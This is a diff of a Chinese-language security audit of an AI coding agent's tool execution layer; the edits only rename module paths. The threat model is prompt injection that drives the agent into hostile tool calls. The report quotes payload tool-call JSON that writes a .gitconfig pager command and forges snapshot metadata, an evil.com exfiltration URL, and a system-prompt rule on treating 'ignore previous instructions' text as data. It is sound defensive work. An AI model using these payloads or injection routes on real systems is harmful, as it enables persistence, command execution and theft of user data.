@@ -4,7 +4,7 @@
 - 审计日期：2026-08-22
 - 审计方法：OWASP Top 10 逐项对照 + STRIDE 威胁建模 + 代码级取证 + 局部动态验证
 - 威胁模型：**模型输出即不可信输入**。假设攻击者能通过被读取的文件内容、网页 / 搜索结果、API 响应等间接通道向 LLM 注入指令，从而操纵 Agent 发出任意工具调用 JSON。审计的核心问题不是"模型会不会被骗"，而是"模型被骗之后，执行层能拦住多少"。
-- 审计范围：`tools/`（base / file_tools / code_tools / db_tools / web_tools / notify_tools）、`execution_layer.py`、`guardian.py`、`ai_code.py` 的确认与权限链路。
+- 审计范围：`tools/`（base / file_tools / code_tools / db_tools / web_tools / notify_tools）、`execution_layer.py`、`core/guardian.py`、`ai_code.py` 的确认与权限链路。
 - 首轮结论：**存在 P0，阻塞发布**。
 - 当前结论（2026-08-22 复审后）：**首轮 P0 五项与后续复审新增的 P0（SEC-013 出站白名单逐跳复检）均已修复并有回归覆盖，不再阻塞发布**；剩余未闭合项集中在 P2 与"待实测"，逐条状态见「复审记录」。下面的「结论摘要」保留首轮原文不改 —— 它记录的是修复前的事实，改写它会让这份报告失去可对照的基线。
 - v3.8 复核（2026-09-18）：见下一节「对账状态」——只对**本次实际重跑过**的条目给结论，没复核的条目如实标注，不许读者把"没提"当成"已复核"。
@@ -34,8 +34,8 @@
 | SEC-013（P1）多条数据外发通道在 write 权限下无确认 | **已闭合**：注册表加 `ToolSpec.egress` 标记，执行层在目的地**既不在内置清单也不在用户 `egress_allowlist`** 时插一次逐次确认，并且外发工具拒绝会话级授权（授权按工具名给 = 出口全开）。`notify_send` 按渠道判（console/file/toast 不出本机不问，email 的收件人由模型给 → 每次问） | `execution_layer.py` `_egress_confirm_reason` / `grant_session`；`tools/registry.py` 的 `egress=True`；test_all [23] 8 条断言（未配清单要问 / 内置端点不问 / 白名单内不问 / 白名单外仍问 / 已批准不重复问 / 会话级降级 / email 要问 / console 不问） |
 | SEC-014（P1）Guardian 快照明文复制密钥文件 | **已闭合**：`.env` / `*.pem` 等不再进快照 | 实测（放入 `.env` 与 `server.pem` 后）快照目录内仍只有 `seed.txt`；BACKLOG `SEC-04` |
 | SEC-015（P2）image_generate 把 prompt 明文发第三方 | **已闭合（转为明示）**：目的地是固定内置服务（不由模型挑）故不逐次确认，但该事实写进 `SECURITY-MODEL.md` 的「外发闸门」，不当隐藏行为 | 文档 + registry 的 `egress=True` 注释 |
-| SEC-016（P2）rollback 先删后恢复，中断即数据丢失 | **已闭合**：删除、恢复、校验三阶段全部**逐项兜异常并继续**——单个文件被占用（Windows 上编辑器/杀软很常见）不再让其余文件停在"已删除、未恢复"；失败项逐条打给用户，并**保留删除前的备份**且给出人工恢复路径；返回 `False` 而不是抛裸异常。审计建议的"临时目录 + 原子替换"未采纳（改动面大且需跨盘 rename 语义），改为等价的"失败可控 + 可人工恢复" | `guardian.py` `rollback`；test_all 3 条断言（返回 False / 其余文件仍恢复 / 备份保留） |
-| SEC-017（P2）执行日志位于项目目录内，Agent 自身可篡改；无安全事件分级 | **已闭合**：① 篡改面 —— `.ace_sessions`、`.agent_flywheel`、`.poc_reports`、`.ace_goals.json`、`.agent_memory.json` 纳入敏感目标，文件工具写删一律 403（与 `.guardian` 同一道闸）；② 分级与告警 —— 安全拦截单列 `security/denied`（`/audit` 带 ⚠ 与累计次数），**到阈值（默认 3 次）向用户告警**（中英日三语），并把"已告警"写回模型 instruction。剩余：`terminal_exec` 仍能删日志——但那一步每次都需人确认，本身就是可见动作 | `tools/base.py` `_AGENT_STATE_DIRNAMES`；`execution_layer.py` `note_security_denial` / `SECURITY_ALERT_THRESHOLD`；`ace_sessionlog.py` `record_security`；test_all 7 条断言 |
+| SEC-016（P2）rollback 先删后恢复，中断即数据丢失 | **已闭合**：删除、恢复、校验三阶段全部**逐项兜异常并继续**——单个文件被占用（Windows 上编辑器/杀软很常见）不再让其余文件停在"已删除、未恢复"；失败项逐条打给用户，并**保留删除前的备份**且给出人工恢复路径；返回 `False` 而不是抛裸异常。审计建议的"临时目录 + 原子替换"未采纳（改动面大且需跨盘 rename 语义），改为等价的"失败可控 + 可人工恢复" | `core/guardian.py` `rollback`；test_all 3 条断言（返回 False / 其余文件仍恢复 / 备份保留） |
+| SEC-017（P2）执行日志位于项目目录内，Agent 自身可篡改；无安全事件分级 | **已闭合**：① 篡改面 —— `.ace_sessions`、`.agent_flywheel`、`.poc_reports`、`.ace_goals.json`、`.agent_memory.json` 纳入敏感目标，文件工具写删一律 403（与 `.guardian` 同一道闸）；② 分级与告警 —— 安全拦截单列 `security/denied`（`/audit` 带 ⚠ 与累计次数），**到阈值（默认 3 次）向用户告警**（中英日三语），并把"已告警"写回模型 instruction。剩余：`terminal_exec` 仍能删日志——但那一步每次都需人确认，本身就是可见动作 | `tools/base.py` `_AGENT_STATE_DIRNAMES`；`execution_layer.py` `note_security_denial` / `SECURITY_ALERT_THRESHOLD`；`cli/ace_sessionlog.py` `record_security`；test_all 7 条断言 |
 | SEC-018（P2）terminal_exec 的内建 mkdir 分支无路径约束 | **已闭合**：那个正则特例**已随执行层重构删除**，统一走 execpolicy | 实测 `terminal_view` 下 `mkdir`/`rmdir`/`del` 一律 403（不在只读白名单）；`terminal_exec` 下 `mkdir C:\outside_probe` → `prompt`（`path_escape`），`mkdir newdir` → allow |
 | SEC-019（P2）熔断不被当作安全边界 | **已闭合（语义确认）**：熔断只为防小模型死循环，**安全 403 不进熔断计数**（`_note_tool_failure` 对 403 直接返回），安全拦截另走事件计数与告警 | 实测连续 4 次安全 403 后 `repeat_fail == {}`，而安全事件计数为 4 |
 
@@ -81,14 +81,14 @@
   - **持久化失败时返回 None 并告警，而不是用一个只存在于内存里的密钥**。后者会让每次启动密钥都不同，上一次会话的快照全部无法回滚 —— 把安全措施变成功能墙比不签名更糟。
   同时 `get_stats()["snapshot_signing"]` 暴露 `active`/`source`，`sign_snapshots=False` 是显式关闭出口（会打印告警，且不再读已有密钥文件，否则"关"关不掉）。启用签名后，建于启用之前的旧快照会因缺 `.sig` 被拒 —— 这是刻意的（否则"删掉 .sig"就是绕过办法），错误信息里说明了处理办法。
   签名的边界：它防的是**文件工具**这条路径（`file_write` 用相对路径改 `.guardian/...`，而 `file_read` 受 `_confined()` 约束读不到主目录下的密钥）。`write`/`full` 权限下 `terminal_exec` 能执行任意命令，密钥自然读得到 —— 那种情形下整台机器都已失守，不是签名要解决的问题。SEC-014（快照留存明文密钥）与本条无关，已在后续单独修复（见下）。
-- SEC-011 外部内容无隔离标记：新增 `ace_isolation.py`，工具结果、`@file`/`@folder` 引用、记忆预注入三条通道统一包进带随机 id 的定界块并标注来源（`<<<ACE_EXTERNAL_DATA id=… source=…>>>`）；三份系统提示词（v8 / tools / v7 兜底）都加了「外部内容边界」段，写明区块内是数据不是指令、出现"忽略先前指令"这类文字要如实报告而不是执行。定界 + 来源 + 提示词约定三件事缺一件都留着缺口：只有标记而没有语义约定，等于没标。
+- SEC-011 外部内容无隔离标记：新增 `core/ace_isolation.py`，工具结果、`@file`/`@folder` 引用、记忆预注入三条通道统一包进带随机 id 的定界块并标注来源（`<<<ACE_EXTERNAL_DATA id=… source=…>>>`）；三份系统提示词（v8 / tools / v7 兜底）都加了「外部内容边界」段，写明区块内是数据不是指令、出现"忽略先前指令"这类文字要如实报告而不是执行。定界 + 来源 + 提示词约定三件事缺一件都留着缺口：只有标记而没有语义约定，等于没标。
   - **不复用 `<EXTERNAL>`/`<INTERNAL>`**。那两个标签是**模型输出**的分段协议（`AgentOutputParser` 解析、`sanitize_plain_content` 清洗）。拿它们包裹外部内容，会让"模型说的"和"外部数据"共用一套标记 —— 而这正是要区分的两件事。
   - **定界块不能被正文自己关掉**。id 随机，且正文里出现的标记字面量直接替换掉。注意 BEGIN 是 END 的前缀，替换必须先 END 后 BEGIN。工具结果这条路径正文是单行 JSON（换行已转义）本就伪造不出行首标记，但 `@file` 与记忆是多行的。
   - **未登记的工具按"外部（未分类）"处理**，并有一条断言要求 `TOOLS` 清单里每个工具都在来源表里 —— 新增工具时忘记登记会被测试挡住，而不是静悄悄降级成"可信"。
   - `@file` 引用进的是**系统提示词**（系统 role 天然被当成最高权威），比工具结果那条路径更危险；隔离块的 id 按会话固定，否则系统提示词逐轮变化会白费上游 KV 缓存。
   - 记忆预注入同样要隔离：注入文本摘自过去的对话，而过去的对话里可能已经混进网页正文 —— 不隔离的话一次注入能跨会话存活。
   - 边界：这是**缓解**不是消除。模型仍可能被说服；隔离标记只是把"外部内容"和"委托人指令"在上下文里分开并给出处置约定，真正的兜底仍是权限层与逐次确认。
-- SEC-008 SSRF 四个窗口：新增 `ace_net.py`，把出站请求收成**一条**路径 `safe_request()`，四个窗口逐条关掉。根因不是"校验写得不够严"——原来的 IP 分类判定本身是对的——而是**校验和连接是两件互不相干的事**：校验解析一次，`requests` 自己再解析一次、自己跟重定向，判定结果从没到达实际连接。
+- SEC-008 SSRF 四个窗口：新增 `core/ace_net.py`，把出站请求收成**一条**路径 `safe_request()`，四个窗口逐条关掉。根因不是"校验写得不够严"——原来的 IP 分类判定本身是对的——而是**校验和连接是两件互不相干的事**：校验解析一次，`requests` 自己再解析一次、自己跟重定向，判定结果从没到达实际连接。
   - **全记录检查**：去掉 `break`，任一条 A/AAAA 命中内网即整体拒绝。一个域名同时挂公网与内网记录时，连哪条由 OS 解析器决定，只看第一条等于没查。
   - **解析失败即拒绝**，替掉 `except Exception: pass`。这是四个窗口里最好用的一条：让第一次解析报错，整段校验就被跳过了。
   - **pin-to-IP**：请求期间接管 `socket.getaddrinfo`，把目标主机的解析结果钉在已校验的那几个 IP 上，TOCTOU / DNS rebinding 的"再解析一次"没有了。**没有采用"把 URL 里的主机名换成 IP"**——那样会同时毁掉 SNI、证书校验和 Host 头，为了防 SSRF 去关掉 TLS 校验是拿一个洞换另一个洞。已实测 `https://example.com` 走这条路径仍是 200 且证书校验正常。
@@ -111,7 +111,7 @@
   - **SEC-013 外发**：`api_post` 与 `notify_send(channel=email)` 逐次确认，摘要里带上目的地 + 要发的内容。`console` / `file` / `toast` 不问 —— 它们都落在本机，email 是通知工具里唯一送出本机的通道。摘要**刻意不打码**：确认框的作用就是让人看见这次要发出去的是什么，把 token 打成 `sk-***` 会让人以为没什么要紧的东西，而那恰好是唯一需要拦住的情况。
   - **顺序：先做无条件拒绝的判定，再问人。** `api_post` 在审批之前先过一次 `ace_net.check_url()`，否则一个注定被拒的目标（回环、`169.254.169.254`）也会弹确认框 —— 那里没有可决定的东西，只有把用户训练成随手点"同意"。这一步不是安全边界（真正的校验仍在 `safe_request` 里与连接绑定，见 SEC-008），代价是多一次 DNS 解析。
   - **仍然敞着的一条**：`api_get` 没有逐次确认，而 `https://evil.com/?data=<窃取的内容>` 同样是一条外发通道。没顺手加是因为那会让每一次取网页都要人点一下，代价与收益不成比例；正确的修法是出站白名单（按用户配置的域名放行，其余问人），那是一轮独立的改动。这里如实记下，不假装 SEC-013 已经全闭。
-- SEC-014 快照留存密钥：`guardian.py` 增加 `is_sensitive_file()`（`.env` / `.env.*` / `*.pem` / `*.key` / `id_rsa` / `.netrc` / `.npmrc` 等，**按文件名判定**）。命中的文件不进快照、也不进回滚前的现状备份，只在 `meta["sensitive_excluded"]` 里登记文件名 + 大小 + SHA-256。
+- SEC-014 快照留存密钥：`core/guardian.py` 增加 `is_sensitive_file()`（`.env` / `.env.*` / `*.pem` / `*.key` / `id_rsa` / `.netrc` / `.npmrc` 等，**按文件名判定**）。命中的文件不进快照、也不进回滚前的现状备份，只在 `meta["sensitive_excluded"]` 里登记文件名 + 大小 + SHA-256。
   - 原来的问题不是"模型能读到"（它本来就能读原文件），而是**扩散与留存**：每轮写操作前的快照都把 `.env` 明文复制一份，最多留 `max_snapshots` 份，轮换过的旧密钥在快照里继续以明文存在，一份被打包/同步/误提交的项目目录会把它们一起带走 —— 而用户以为自己只备份了代码。
   - **代价说清楚**：回滚不再恢复这些文件的内容。这是有意的取舍 —— 回滚是"撤销对代码的改动"的安全网，不是密钥仓库的备份。不备份的另一面是回滚也**不会删除**它们（`_collect_files()` 是快照、备份、清空三处共用的同一份收集结果，口径一致才不会出现"备份里没有、却先把它删了"的净损失）。
   - **没备份可以，静默丢失不行**：`sensitive_drift()` 用登记的哈希比对现状，回滚时把"`.env` 内容已变、快照未保存其内容"写进 `last_rollback_notes`，由执行层放进熔断结果的 `rollback_notes` 回传。`list_snapshots()` 也报出被排除的数量，`/snapshots` 里就能看见。
@@ -175,7 +175,7 @@ SEC-006 续（三段闸门）这一轮又翻了一批断言，方向相反但性
 - **`file_move` 只查了 `dest`（已闭）。** 永不可写黑名单原来只对目标端生效，于是"把 `~/.ssh/authorized_keys` 搬走"是放行的。判据本来就该是"这次操作是否改变系统的凭据或执行路径"，而这件事对两端对称。现在 `src` 与 `dest` 都过 `_deny_never_writable()`。
 - **`read_allowlist` 里的相对路径条目（已闭）。** 原来直接 `Path(entry).resolve()`，相对条目会按**进程 cwd** 解析 —— 同一份配置在不同工作目录下授权的是不同目录。现在非绝对（用 `Path.is_absolute()`，能同时挡住 `\Windows` 和 `C:Windows`）且非 `~` 开头的条目被忽略，并留一条按条目去重的 warning。规则写死为"只接受绝对路径或 `~` 开头"。
 - **`terminal_view` 的输出上限（已闭；属可用性，但后果落在安全性上）。** 目录列表和外部命令 stdout 原来无上限，`tree` 扫一棵大仓库、`git log` 不带 `-n` 就能几十万字灌进模型上下文，把真正重要的历史挤出窗口。现在统一走 `MAX_VIEW_OUTPUT_CHARS`，并且**每一处截断都回报 `truncated`** —— 截了不说比不截更糟：模型会把半个文件当成整个文件去改、把被截的目录列表当成"这个项目没有测试"的证据，而它没有任何线索去怀疑这一点。超时也从写死的 30 秒改成与执行器同一个时钟源，且超时后已打印的输出照给（那往往是"卡在哪一步"的唯一线索）。
-- **环境白名单的两份拷贝（已闭，附回归断言）。** 缺 `SystemDrive` 会让子进程在自己的 cwd 里长出一棵名叫 `%SystemDrive%` 的垃圾目录树（Windows shell 层有一批 `%SystemDrive%\ProgramData\...` 字面量靠环境变量展开，变量缺失时那条路径退化成相对路径）—— 生产上那个 cwd 就是用户的项目目录。第一次只修了 `executor/run.go` 的 `defaultEnvAllow`，而它只在 `len(allow) == 0` 时才被查到，宿主 `ace_executor.py` 永远显式下发自己那份 `DEFAULT_ENV_ALLOW`，所以"修好了"的现象照旧复现。两份现已一致，并有一条断言从 `run.go` 里正则解析出列表逐项比对 —— "同一份清单有两份拷贝"正是这个问题被漏掉的原因，所以判据要盯漂移本身。故意**不**放行 `APPDATA` / `LOCALAPPDATA`：那是用户可写的状态目录，交给沙箱里的子进程等于白送一块持久化落脚点。
+- **环境白名单的两份拷贝（已闭，附回归断言）。** 缺 `SystemDrive` 会让子进程在自己的 cwd 里长出一棵名叫 `%SystemDrive%` 的垃圾目录树（Windows shell 层有一批 `%SystemDrive%\ProgramData\...` 字面量靠环境变量展开，变量缺失时那条路径退化成相对路径）—— 生产上那个 cwd 就是用户的项目目录。第一次只修了 `executor/run.go` 的 `defaultEnvAllow`，而它只在 `len(allow) == 0` 时才被查到，宿主 `core/ace_executor.py` 永远显式下发自己那份 `DEFAULT_ENV_ALLOW`，所以"修好了"的现象照旧复现。两份现已一致，并有一条断言从 `run.go` 里正则解析出列表逐项比对 —— "同一份清单有两份拷贝"正是这个问题被漏掉的原因，所以判据要盯漂移本身。故意**不**放行 `APPDATA` / `LOCALAPPDATA`：那是用户可写的状态目录，交给沙箱里的子进程等于白送一块持久化落脚点。
 
 
 **同日第二批：`data` 侧、`metadata` 的受众、以及界面语言**
@@ -606,7 +606,7 @@ SEC-006 续（三段闸门）这一轮又翻了一批断言，方向相反但性
   {"tool":"file_write","path":"C:/Users/<用户>/.gitconfig","content":"[core]\n  pager = <命令>"}
   ```
 
-- **影响**：项目目录外的任意文件写入与删除。写入启动目录 = 持久化；覆写 `.gitconfig` / `.bashrc` / PowerShell profile = 延迟命令执行。Guardian 快照只覆盖项目目录（`guardian.py:60-67` 从 `project_root` 开始 walk），**这些破坏不可回滚**。
+- **影响**：项目目录外的任意文件写入与删除。写入启动目录 = 持久化；覆写 `.gitconfig` / `.bashrc` / PowerShell profile = 延迟命令执行。Guardian 快照只覆盖项目目录（`core/guardian.py:60-67` 从 `project_root` 开始 walk），**这些破坏不可回滚**。
 - **现有缓解**：`confine_files` 开关存在，但该分支是在 `confine_files=True` 时依然放行的显式例外。
 - **建议缓解**：
   1. 绝对路径写入需人工确认，确认提示展示完整目标路径。
@@ -618,7 +618,7 @@ SEC-006 续（三段闸门）这一轮又翻了一批断言，方向相反但性
 
 ### SEC-010（P1 / Tampering + Repudiation）快照 HMAC 签名从未启用，无配置入口
 
-- **文件位置**：`guardian.py:41-56`、`113-115`、`142-148`；`execution_layer.py:377`；`ai_code.py`（无对应配置项）
+- **文件位置**：`core/guardian.py:41-56`、`113-115`、`142-148`；`execution_layer.py:377`；`ai_code.py`（无对应配置项）
 - **触发条件**：所有默认部署。
 - **代码证据**：
 
@@ -632,11 +632,11 @@ SEC-006 续（三段闸门）这一轮又翻了一批断言，方向相反但性
   后果是两处校验被静默跳过：
 
   ```python
-  # guardian.py:113-115（签名生成）
+  # core/guardian.py:113-115（签名生成）
   if self.signing_key:
       (dest_root / "meta.json.sig").write_text(self._sign(meta_text), ...)
 
-  # guardian.py:142-148（签名校验）
+  # core/guardian.py:142-148（签名校验）
   if self.signing_key:
       sig_path = dest_root / "meta.json.sig"
       if not sig_path.exists():
@@ -652,10 +652,10 @@ SEC-006 续（三段闸门）这一轮又翻了一批断言，方向相反但性
   {"tool":"file_write","path":".guardian/snapshots/<snap_id>/meta.json","content":"<伪造的 file_count 与 sha256>"}
   ```
 
-  `verify_snapshot` 会按伪造的 meta 校验（`guardian.py:152-157` 用 meta 里的 sha256 与 meta 里列出的文件比对），自洽的伪造 meta 可通过校验。随后 `rollback` 会按伪造清单删除并"恢复"文件（`guardian.py:179-185`）。
+  `verify_snapshot` 会按伪造的 meta 校验（`core/guardian.py:152-157` 用 meta 里的 sha256 与 meta 里列出的文件比对），自洽的伪造 meta 可通过校验。随后 `rollback` 会按伪造清单删除并"恢复"文件（`core/guardian.py:179-185`）。
 
 - **影响**：回滚机制本身可被攻击者操纵——这不只是"保护失效"，而是把恢复手段转化为破坏手段（`rollback` 会先 `unlink` 所有当前文件）。同时快照元信息不可信，事后取证与责任归属（Repudiation）失去依据。
-- **现有缓解**：快照 id 含 `uuid4` 随机后缀（`guardian.py:86`），不可预测——但攻击者可通过 `list_snapshots` 或 `terminal_view dir .guardian/snapshots` 直接枚举。
+- **现有缓解**：快照 id 含 `uuid4` 随机后缀（`core/guardian.py:86`），不可预测——但攻击者可通过 `list_snapshots` 或 `terminal_view dir .guardian/snapshots` 直接枚举。
 - **建议缓解**：
   1. 在 `ai_code.py` 增加 `signing_key` 配置项（优先环境变量，如 `ACE_SIGNING_KEY`），首次运行自动生成随机密钥并持久化到项目目录**之外**。
   2. 密钥为空时不应静默跳过——应打印醒目警告，或直接拒绝启动快照功能。
@@ -704,7 +704,7 @@ SEC-006 续（三段闸门）这一轮又翻了一批断言，方向相反但性
   img.save(str(shot_path))
   ```
 
-  抓取的是**整个虚拟桌面**（PowerShell 回退分支 `131` 行明确使用 `SystemInformation]::VirtualScreen`，即全部显示器），不是浏览器窗口。工具命名容易让人以为只截浏览器，实际范围是整屏。截图保存到 `.ace_shots/`（项目目录内），且该目录在 Guardian 的 `EXCLUDE_DIRS` 中（`guardian.py:31`），不进快照。
+  抓取的是**整个虚拟桌面**（PowerShell 回退分支 `131` 行明确使用 `SystemInformation]::VirtualScreen`，即全部显示器），不是浏览器窗口。工具命名容易让人以为只截浏览器，实际范围是整屏。截图保存到 `.ace_shots/`（项目目录内），且该目录在 Guardian 的 `EXCLUDE_DIRS` 中（`core/guardian.py:31`），不进快照。
 
 - **可复现 payload**：
 
@@ -766,12 +766,12 @@ SEC-006 续（三段闸门）这一轮又翻了一批断言，方向相反但性
 
 ### SEC-014（P1 / Information Disclosure）Guardian 快照将项目内密钥文件明文复制并长期留存
 
-- **文件位置**：`guardian.py:28-31`（`EXCLUDE_DIRS`）、`60-67`（`_collect_files`）、`98-106`（复制）
+- **文件位置**：`core/guardian.py:28-31`（`EXCLUDE_DIRS`）、`60-67`（`_collect_files`）、`98-106`（复制）
 - **触发条件**：任何写操作触发快照（`execution_layer.py:573`：`if tool_name in WRITE_TOOLS and self.guardian`）。
 - **代码证据**：
 
   ```python
-  # guardian.py:60-67
+  # core/guardian.py:60-67
   def _collect_files(self) -> List[Path]:
       files: List[Path] = []
       for dirpath, dirnames, filenames in os.walk(self.project_root):
@@ -781,7 +781,7 @@ SEC-006 续（三段闸门）这一轮又翻了一批断言，方向相反但性
       return files
   ```
 
-  排除清单只作用于**目录**，没有任何文件名 / 扩展名级排除。项目根下的 `.env`、`credentials.json`、`*.pem`、`*.key` 等会被 `shutil.copy2` 原样复制进 `.guardian/snapshots/<id>/files/`（`guardian.py:102`），并保留最多 20 份（`max_snapshots=20`，`guardian.py:48`）。
+  排除清单只作用于**目录**，没有任何文件名 / 扩展名级排除。项目根下的 `.env`、`credentials.json`、`*.pem`、`*.key` 等会被 `shutil.copy2` 原样复制进 `.guardian/snapshots/<id>/files/`（`core/guardian.py:102`），并保留最多 20 份（`max_snapshots=20`，`core/guardian.py:48`）。
 
 - **可复现 payload**：无需 payload——正常使用即触发。任一次 `file_write` 后，`.guardian/snapshots/` 下即出现项目内所有密钥文件的明文副本。
 - **影响**：密钥副本数量放大 20 倍，且散落在一个不受版本控制、容易被误打包 / 误提交 / 误同步到云盘的目录中。`.gitignore` 存在（项目根），**需实测验证**其是否覆盖 `.guardian`——若未覆盖，密钥将随提交外泄。
@@ -819,12 +819,12 @@ SEC-006 续（三段闸门）这一轮又翻了一批断言，方向相反但性
 
 ### SEC-016（P2 / Denial of Service）rollback 先删除全部文件再恢复，中断即数据丢失
 
-- **文件位置**：`guardian.py:162-197`
+- **文件位置**：`core/guardian.py:162-197`
 - **触发条件**：执行回滚，且在删除与恢复之间发生中断（进程被杀、磁盘满、权限错误、文件被占用）。
 - **代码证据**：
 
   ```python
-  # guardian.py:179-185
+  # core/guardian.py:179-185
   for src in self._collect_files():
       src.unlink(missing_ok=True)        # ← 先全部删除
   for rel, _info in meta["files"].items():
@@ -993,7 +993,7 @@ SEC-006 续（三段闸门）这一轮又翻了一批断言，方向相反但性
 
 - **`math_calc` / `image_generate` 的输入格式校验**：`size` 的 `^(\d{2,4})x(\d{2,4})$`（`web_tools.py:207`）、表达式长度上限 200（`code_tools.py:170`）、代码长度上限 100KB（`code_tools.py:91`）、命令长度上限 4000（`base.py:21`）。边界值校验覆盖得比较完整。
 
-- **快照完整性自检**（`guardian.py:116-120`）：创建快照后立即 `verify_snapshot`，失败则删除并抛 `SnapshotError`，不留下"看起来存在但实际损坏"的快照。这个 fail-fast 设计是对的。
+- **快照完整性自检**（`core/guardian.py:116-120`）：创建快照后立即 `verify_snapshot`，失败则删除并抛 `SnapshotError`，不留下"看起来存在但实际损坏"的快照。这个 fail-fast 设计是对的。
 
 ---
 
